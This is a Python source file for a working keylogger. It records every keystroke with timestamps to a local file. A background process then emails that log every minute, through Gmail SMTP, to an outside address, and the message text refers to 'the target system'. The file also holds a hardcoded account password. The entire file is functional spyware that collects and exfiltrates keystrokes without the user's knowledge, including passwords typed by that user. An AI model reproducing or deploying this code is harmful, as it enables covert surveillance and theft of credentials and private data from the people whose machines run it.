#!/usr/bin/python3
#!C:/Users/ahad/AppData/Local/Programs/Python/Python310/python.exe
from pynput.keyboard import Listener
from datetime import datetime 
from email.message import EmailMessage
import smtplib, os,urllib.request
import multiprocessing, time

keys=[]
path='/tmp/log.txt'

logInfo={
    'smtpserver':'smtp.gmail.com',
    'port':465,
    'username':'abc@gmail.com',
    'passwd':'owppffchvauwhmvn'
}

msg={
    'Subject':'LogFile.',
    'From':'Target'+"'"+'s'+'system.'+logInfo['username'],
    'To':'duaten@yandex.com',
    'content':'The log file that receive from the target system. '
}

def writeFile(keys):
    with open(path,'a') as f:
        for key in keys:
            k=str(key)
            if k.find('backspace')>0:
                f.write(str(datetime.now())+' :: '+'BackSpace'+'\n')
            elif k.find('caps_lock')>0:
                f.write(str(datetime.now())+' :: '+'Caps_Lock'+'\n')
            elif k.find('alt')>0:
                f.write(str(datetime.now())+' :: '+'Alt'+'\n')
            elif k.find('alt_gr')>0:
                f.write(str(datetime.now())+' :: '+'AltGr'+'\n')
            elif k.find('scroll_lock')>0:
                f.write(str(datetime.now())+' :: '+'Scroll Lock'+'\n')
            elif k.find('print_screen')>0:
                f.write(str(datetime.now())+' :: '+'Print Screen'+'\n')
            elif k.find('cmd')>0:
                f.write(str(datetime.now())+' :: '+'Super Key'+'\n')
            elif k.find('tab')>0:
                f.write(str(datetime.now())+' :: '+'Tab'+'\n')
            elif k.find('up')>0:
                f.write(str(datetime.now())+' :: '+'UP'+'\n')
            elif k.find('ctrl')>0:
                f.write(str(datetime.now())+' :: '+'Ctrl'+'\n')
            elif k.find('left')>0:
                f.write(str(datetime.now())+' :: '+'Left '+'\n')
            elif k.find('right')>0:
                f.write(str(datetime.now())+' :: '+'Right '+'\n')
            elif k.find('delete')>0:
                f.write(str(datetime.now())+' :: '+'Delete'+'\n')
            elif k.find('shift')>0:
                f.write(str(datetime.now())+' :: '+'Shift'+'\n')
            elif k.find('space')>0:
                f.write(str(datetime.now())+' :: '+'Space'+'\n')
            elif k.find('enter')>0:
                f.write(str(datetime.now())+' :: '+'Enter'+'\n')
            elif k.find('esc')>0:
                f.write(str(datetime.now())+' :: '+'Esc'+'\n')
            elif k.find('f1')>0:
                f.write(str(datetime.now())+' :: '+'F1'+'\n')
            elif k.find('f2')>0:
                f.write(str(datetime.now())+' :: '+'F2'+'\n')
            elif k.find('f3')>0:
                f.write(str(datetime.now())+' :: '+'F3'+'\n')
            elif k.find('f4')>0:
                f.write(str(datetime.now())+' :: '+'F4'+'\n')
            elif k.find('f5')>0:
                f.write(str(datetime.now())+' :: '+'F5'+'\n')
            elif k.find('f6')>0:
                f.write(str(datetime.now())+' :: '+'F6'+'\n')
            elif k.find('f7')>0:
                f.write(str(datetime.now())+' :: '+'F7'+'\n')
            elif k.find('f8')>0:
                f.write(str(datetime.now())+' :: '+'F8'+'\n')
            elif k.find('f9')>0:
                f.write(str(datetime.now())+' :: '+'F9'+'\n')
            elif k.find('f10')>0:
                f.write(str(datetime.now())+' :: '+'F10'+'\n')
            elif k.find('f11')>0:
                f.write(str(datetime.now())+' :: '+'F11'+'\n')
            elif k.find('f12')>0:
                f.write(str(datetime.now())+' :: '+'F12'+'\n')
            elif k.find('down')>0:
                f.write(str(datetime.now())+' :: '+'Down'+'\n')
            elif k.find('end')>0:
                f.write(str(datetime.now())+' :: '+'End'+'\n')
            elif k.find('home')>0:
                f.write(str(datetime.now())+' :: '+'Home'+'\n')
            elif k.find('insert')>0:
                f.write(str(datetime.now())+' :: '+'Insert'+'\n')
            elif k.find('num_lock')>0:
                f.write(str(datetime.now())+' :: '+'NumLock'+'\n')
            elif k.find('page_down')>0:
                f.write(str(datetime.now())+' :: '+'Page Down'+'\n')
            elif k.find('page_up')>0:
                f.write(str(datetime.now())+' :: '+'Page UP'+'\n')
            elif k.find('pause')>0:
                f.write(str(datetime.now())+' :: '+'Pause'+'\n')
            
            else:
                f.write(str(datetime.now())+' :: '+k+'\n')
        
        keys.clear()
        
def on_Press(key):
    keys.append(key)
    writeFile(keys)

def listening():
    with Listener(on_press=on_Press) as listen:
        listen.join()

def checkInternet():
    try:
        urllib.request.urlopen('https://www.google.com/')
        sendMail()
    except:
        pass

def sendMail():
    message=EmailMessage()
    message['Subject']=msg['Subject']
    message['From']=msg['From']
    message['To']=msg['To']
    message.set_content(msg['content'])

    with open(path,'rb') as logfile:
        filedata=logfile.read()
        filename='LogData'
        message.add_attachment(filedata,maintype='application',subtype='txt',filename=filename)
    

    with smtplib.SMTP_SSL(logInfo['smtpserver'],logInfo['port']) as server:
        try:
            server.login(logInfo['username'],logInfo['passwd'])
            server.send_message(message)
            print('Message sent.')        
        except smtplib.SMTPAuthenticationError:
            print('!!!AuthError....')
            server.quit() 


def continue_Check_Internet():
    while True:
        checkInternet()
        time.sleep(60)    

def main():
    global keys, path
    try:
        open(path,'w')
        pro1=multiprocessing.Process(target=listening)
        pro2=multiprocessing.Process(target=continue_Check_Internet)
        pro1.start()
        pro2.start()
        pro1.join()
        pro2.join()

    except KeyboardInterrupt:
        try:
            pro1.terminate()
            pro2.terminate()
            os.remove(path)
            os._exit(0)
        except SystemExit:
            os.remove(path)
            exit()

if __name__=="__main__":
    main()
